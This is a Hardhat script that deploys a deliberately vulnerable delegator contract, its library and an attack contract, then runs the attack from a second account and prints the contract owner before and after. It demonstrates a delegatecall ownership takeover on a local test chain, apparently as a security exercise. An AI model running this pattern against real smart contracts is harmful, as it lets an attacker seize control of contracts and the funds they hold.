import { ethers } from "hardhat";

async function main() {
    
    const [acc1, acc2] = await ethers.getSigners()

    const library = await ethers.getContractFactory("delegateLibrary")
    const delLibrary = await library.deploy()

    const delegator = await ethers.deployContract("VulnDelegator", [delLibrary.target])
    await delegator.waitForDeployment()

    console.log("")
    console.log(`Owner of vulnerable contract is: ${await delegator.owner()}`)
    console.log(`Address of Attacker is: ${acc2.address}`)

    const exploit = await ethers.deployContract("AttackDel", [delegator.target])
    await exploit.waitForDeployment()

    await exploit.connect(acc2).initiateAttack(acc2.address)

    console.log("")
    console.log(`Owner of vulnerable contract after the exploit is: ${await delegator.owner()}`)
}

main().catch((error) => {
    console.error(error)
    process.exitCode=1
})